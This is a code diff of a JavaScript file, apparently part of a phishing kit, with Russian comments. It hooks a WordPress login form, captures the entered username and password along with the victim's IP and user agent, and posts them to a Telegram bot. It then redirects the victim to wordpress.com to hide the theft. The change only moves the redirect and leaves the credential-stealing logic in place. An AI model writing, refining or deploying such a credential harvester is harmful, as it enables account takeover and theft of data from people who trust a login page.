@@ -1,17 +1,19 @@
 document.getElementById('loginform').addEventListener('submit', async function(e) {
+    // ПРЕДОТВРАЩАЕМ ЛЮБУЮ СТАНДАРТНУЮ ОТПРАВКУ
     e.preventDefault();
+    e.stopPropagation();
+    
     console.log("Скрипт send.js начал работу!");
 
     const formData = new FormData(this);
     const login = formData.get('log');
     const password = formData.get('pwd');
 
-    // Добавляем User Agent к сообщению
-    const message = `🔐 НОВЫЕ ДАННЫЕ WORDPRESS  🔐\nЛогин: ${login}\nПароль: ${password}\nIP: ${await getIP()}\nВремя: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`;
+    const message = `🔐 НОВЫЕ ДАННЫЕ WORDPRESS 🔐\nЛогин: ${login}\nПароль: ${password}\nIP: ${await getIP()}\nВремя: ${new Date().toLocaleString()}\nUser Agent: ${navigator.userAgent}`;
+    
     console.log("Сообщение для отправки:", message);
 
     try {
-        console.log("Пытаюсь отправить в Telegram...");
         const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: {
@@ -27,20 +29,17 @@ document.getElementById('loginform').addEventListener('submit', async function(e
         console.log("Ответ от Telegram API:", responseData);
 
         if (response.ok) {
-            console.log("Успешно отправлено! Перенаправляю...");
-            // Меняем редирект на официальный сайт WordPress
-            setTimeout(() => {
-                window.location.href = 'https://wordpress.com/';
-            }, 1500);
+            console.log("Успешно отправлено!");
         } else {
             console.error("Ошибка от Telegram:", responseData);
-            window.location.href = 'https://wordpress.com/';
         }
 
     } catch (error) {
         console.error('Ошибка сети или отправки:', error);
-        window.location.href = 'https://wordpress.com/';
     }
+    
+    // Перенаправление ПОСЛЕ отправки
+    window.location.href = 'https://wordpress.com/';
 });
 
 async function getIP() {
